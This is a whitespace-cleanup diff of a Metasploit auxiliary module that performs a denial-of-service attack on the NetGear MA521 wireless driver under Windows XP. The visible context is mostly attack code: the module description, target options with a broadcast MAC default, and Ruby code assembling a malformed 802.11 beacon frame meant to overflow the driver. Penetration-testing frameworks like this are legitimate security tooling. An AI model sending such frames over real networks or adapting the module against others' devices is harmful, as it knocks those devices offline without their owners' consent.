@@ -3,7 +3,7 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -17,25 +17,25 @@ class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Lorcon2
 	include Msf::Auxiliary::Dos
-	
+
 	def initialize(info = {})
-		super(update_info(info,	
+		super(update_info(info,
 			'Name'           => 'NetGear MA521 Wireless Driver Long Rates Overflow',
 			'Description'    => %q{
 				This module exploits a buffer overflow in the NetGear MA521 wireless device
 				driver under Windows XP. When a specific malformed frame (beacon or probe response)
-				is received by the wireless	interface under active scanning mode, the MA521nd5.SYS 
+				is received by the wireless	interface under active scanning mode, the MA521nd5.SYS
 				driver attempts to write to	an attacker-controlled memory location. The vulnerability
 				is triggered by an invalid supported rates information element.
-				
-				This DoS was tested with version 5.148.724.2003 of the MA521nd5.SYS driver and a 
+
+				This DoS was tested with version 5.148.724.2003 of the MA521nd5.SYS driver and a
 				NetGear MA521 Cardbus adapter. A remote code execution module is also in development.
 
 				This module depends on the Lorcon2 library and only works on the Linux platform
-				with a supported wireless card. Please see the Ruby Lorcon2 documentation 
+				with a supported wireless card. Please see the Ruby Lorcon2 documentation
 				(external/ruby-lorcon/README) for more information.
 			},
-			
+
 			'Author'         => [ 'Laurent Butti <0x9090 [at] gmail.com>' ], # initial discovery and metasploit module
 			'License'        => MSF_LICENSE,
 			'References'     =>
@@ -44,13 +44,13 @@ class Metasploit3 < Msf::Auxiliary
 					['OSVDB', '30507'],
 					['URL', 'http://projects.info-pull.com/mokb/MOKB-18-11-2006.html'],
 					['URL', 'ftp://downloads.netgear.com/files/ma521_1_2.zip']
-				] 
+				]
 		))
 		register_options(
 			[
 				OptInt.new('RUNTIME', [ true, "The number of seconds to run the attack", 60]),
 				OptString.new('ADDR_DST', [ true,  "The MAC address of the target system", 'FF:FF:FF:FF:FF:FF'])
-			], self.class)					
+			], self.class)
 	end
 
 	def run
@@ -80,15 +80,15 @@ class Metasploit3 < Msf::Auxiliary
 		ssid     = Rex::Text.rand_text(6)
 		bssid    = Rex::Text.rand_text(6)
 		seq      = [rand(255)].pack('n')
-		
-		frame = 
+
+		frame =
 			"\x80" +                      # type/subtype
 			"\x00" +                      # flags
-			"\x00\x00" +                  # duration  
+			"\x00\x00" +                  # duration
 			eton(datastore['ADDR_DST']) + # dst
 			bssid +                       # src
 			bssid +                       # bssid
-			seq   +                       # seq  
+			seq   +                       # seq
 			Rex::Text.rand_text(8) +      # timestamp value
 			"\x64\x00" +      	          # beacon interval
 			"\x01\x00" +		          # capabilities
@@ -101,7 +101,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		# channel IE
 		"\x03" + "\x01" + channel.chr
-		
+
 		return frame
 
 	end
